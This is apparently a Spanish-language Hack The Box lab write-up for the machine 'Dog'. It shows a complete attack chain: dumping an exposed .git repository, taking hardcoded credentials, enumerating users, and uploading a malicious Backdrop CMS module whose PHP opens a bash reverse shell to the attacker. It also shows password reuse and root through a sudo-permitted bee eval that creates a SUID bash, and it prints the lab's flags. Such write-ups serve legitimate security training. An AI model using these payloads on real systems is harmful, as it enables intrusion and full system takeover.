---
tags:
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/651
dificultad: Fácil
ip: 10.10.11.58
os: Linux
linked:
  - "[[Information Disclosure]]"
  - "[[Information Leakage]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[Abusing Sudoers Privilege]]"
  - "[[Password Reuse]]"
---
# HackTheBox - Dog

## Reconocimiento

### Escaneo de puertos con Nmap

Mi primer paso en el reconocimiento de la máquina `dog.htb` fue un escaneo exhaustivo de puertos utilizando `Nmap`. Para agilizar el proceso, primero identifiqué los puertos abiertos y luego lancé un escaneo más detallado sobre ellos.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Reconnaissance/allports
nmap -sCV -p22,80 $(cat ip) -oN 00_Reconnaissance/dog-sCV
```
El resultado del escaneo mostró dos servicios principales:
- **Puerto 22/tcp:** `OpenSSH 8.2p1` corriendo en Ubuntu.

- **Puerto 80/tcp:** `Apache httpd 2.4.41`, sirviendo un `Backdrop CMS`.

Lo más interesante que `Nmap` reveló fue la presencia de un repositorio Git expuesto en `http://dog.htb/.git/`. Esta es una pista crítica que seguiré de inmediato.
```Plaintext
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.10.11.58:80/.git/
|   Git repository found!
|   Repository description: Unnamed repository; edit this file 'description' to name the...
|_  Last commit message: todo: customize url aliases. reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Directorio .git expuesto

Aprovechando el directorio `.git` expuesto, utilicé la herramienta `git-dumper` para descargar el código fuente completo del sitio web.

> [!tip] Repositorios .git expuestos 🕵️‍♂️
> 
> Cuando un directorio .git queda expuesto en un servidor web, permite a cualquiera descargar el historial completo del repositorio, incluyendo código fuente, commits anteriores y, a menudo, información sensible como contraseñas o claves API que fueron eliminadas en commits posteriores pero que aún persisten en el historial.

```bash
# Creo un entorno virtual y descargo git-dumper
$ virtualenv env
$ source env/bin/activate
$ pip3 install git-dumper

# Descargo el contenido del repositorio
$ git-dumper http://dog.htb/ dump
```

Una vez descargado, restauré los archivos del repositorio para poder analizarlos.
```Bash
$ cd dump
$ git restore .
```


---

## Análisis de vulnerabilidades

### Credenciales Hardcodeadas en settings.php

Al inspeccionar los archivos del código fuente, mi atención se centró en el archivo de configuración `settings.php`. Dentro de él, encontré credenciales hardcodeadas para la base de datos MySQL. 🔑
```PHP
$ cat settings.php
<?php
/**
* @file
* Main Backdrop CMS configuration file.
*/
...
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
...
```

Aunque el servicio MySQL no estaba expuesto externamente, la contraseña `BackDropJ2024DS2024` era un hallazgo muy valioso que guardé para más adelante.

### Enumeración de usuarios a través de URL Aliases

Con una contraseña en mi poder pero sin un nombre de usuario, necesitaba encontrar usuarios válidos en el CMS. Intentar un ataque de fuerza bruta en la página de login resultó en bloqueos temporales por parte del servidor.

Investigando sobre Backdrop CMS, descubrí que es posible enumerar usuarios válidos a través de los alias de URL. Al visitar `/?q=accounts/USERNAME`, el sistema responde de manera diferente si el usuario existe (código `403 Forbidden`) o no (código `404 Not Found`).

Utilicé `ffuf` para automatizar este proceso y fuzzear el endpoint con una lista de nombres de usuario comunes.
```Bash
$ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://dog.htb/\?q=accounts/FUZZ -c -v -mc 403
```

`ffuf` rápidamente identificó dos usuarios válidos: **`john`** y **`tiffany`**.
```Plaintext
[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 282ms]
    * FUZZ: john

[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 451ms]
    * FUZZ: tiffany
```


---

## Explotación de vulnerabilidades

### Acceso al panel de administración

Armado con una contraseña y dos nombres de usuario, procedí a probar las credenciales en el panel de login de Backdrop CMS. La combinación `tiffany:BackDropJ2024DS2024` funcionó, otorgándome acceso como **Administrador** del sitio.

### RCE a través de la subida de módulos

Con privilegios de administrador, mi siguiente objetivo era conseguir ejecución remota de comandos (RCE). Buscando exploits públicos para la versión de Backdrop CMS (`1.27.1`, encontrada en el archivo `testing.info` del repo), di con una vulnerabilidad de RCE autenticado a través de la subida de módulos.

> [!bug] Vulnerabilidad: RCE por subida de archivos 💥
> 
> La vulnerabilidad permite a un administrador subir un archivo comprimido (.tar.gz) que contiene un módulo. El CMS no valida correctamente el contenido del módulo, lo que me permite incluir un archivo PHP malicioso (una webshell) y ejecutarlo en el servidor.

Creé manualmente un archivo `shell.info` (requerido por el CMS) y un `shell.php` con una reverse shell. Luego, los comprimí en un archivo `shell.tar.gz`.

**shell.info:**
```Ini, TOML
type = module
name = shell
description = "RCE"
```

**shell.php:**
```PHP
<?php
  shell_exec('bash -c "bash -i >& /dev/tcp/TUN_IP/PORT 0>&1"');
?>
```

```Bash
# Creo el directorio y los archivos
$ mkdir shell
$ # (creo los archivos shell.info y shell.php adentro)

# Comprimo el directorio en el formato correcto
$ tar -czvf shell.tar.gz shell
```

Navegué a la sección de instalación de módulos (`/?q=admin/modules/install`), subí mi archivo `shell.tar.gz` y el sistema lo instaló sin problemas.

Para activar la shell, simplemente accedí a `http://dog.htb/modules/shell/shell.php` mientras escuchaba con `netcat` en mi máquina.

```Bash
# Mi listener de Netcat
$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.58] 49766
bash: cannot set terminal process group (890): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/shell$
```

¡Éxito! Tenía una shell en el sistema como el usuario `www-data`. Después de estabilizarla con Python PTY, estaba listo para escalar privilegios.


---

## Escalada de privilegios

### Movimiento Lateral: Reutilización de Contraseña

Dentro de la máquina, inspeccioné el archivo `/etc/passwd` y encontré un usuario con un directorio home: `johncusack`.

Recordando la contraseña `BackDropJ2024DS2024`, aposté a que podría haber sido reutilizada. Es una práctica insegura pero muy común.

> [!warning] Reutilización de contraseñas
> 
> Nunca reutilices contraseñas entre diferentes servicios. Comprometer una sola cuenta puede llevar a la caída de todas las demás, como se demuestra en este caso.

Probé la contraseña para el usuario `johncusack` vía SSH y funcionó. Esto me permitió pasar de una shell inestable como `www-data` a una sesión SSH estable como `johncusack`.
```Bash
$ sshpass -p 'BackDropJ2024DS2024' ssh johncusack@dog.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
...
johncusack@dog:~$ whoami && id
johncusack
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
```

### Escalada a root: Abuso de Sudo y Bee

Como `johncusack`, el primer comando que ejecuté fue `sudo -l` para verificar mis privilegios.
```Bash
johncusack@dog:~$ sudo -l
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

El resultado fue muy prometedor. Podía ejecutar el binario `/usr/local/bin/bee` como `root` sin necesidad de contraseña. Una búsqueda rápida reveló que `bee` es una utilidad de línea de comandos para gestionar Backdrop CMS, y posee una función `eval` que permite ejecutar código PHP arbitrario.

Esta fue mi ruta directa a `root`. 🚀

Primero, confirmé que podía ejecutar comandos como `root`:
```Bash
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
root
uid=0(root) gid=0(root) groups=0(root)
```

Luego, utilicé esta capacidad para crear una copia de `/bin/bash` en `/tmp`, y le asigné el bit **SUID**. Esto me permitiría ejecutar una shell con los permisos del propietario del archivo (en este caso, `root`).
```Bash
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cp /bin/bash /tmp/bash && chmod u+s /tmp/bash');"
```

Verifiqué que el bit SUID se había establecido correctamente:
```Bash
johncusack@dog:~$ ls -la /tmp/bash
-rwsr-xr-x 1 root root 1183448 Jul 6 17:07 /tmp/bash
```

Finalmente, ejecuté el bash modificado con el parámetro `-p` para mantener los permisos efectivos (euid=0) y obtener una shell de `root`.
```Bash
johncusack@dog:~$ /tmp/bash -p
bash-5.0# whoami && id
root
uid=1001(johncusack) gid=1001(johncusack) euid=0(root) groups=1001(johncusack)
bash-5.0# cat /root/root.txt
```

Máquina completada.


---

## Bandera(s)

> [!flag] `flag{user}`
> fd8487bf5396718f7ead8351d88e3dbb
^bandera-user

> [!flag] `flag{root}`
> 1f7ce9bc4e770fbc580199d12e198e4b
^bandera-root
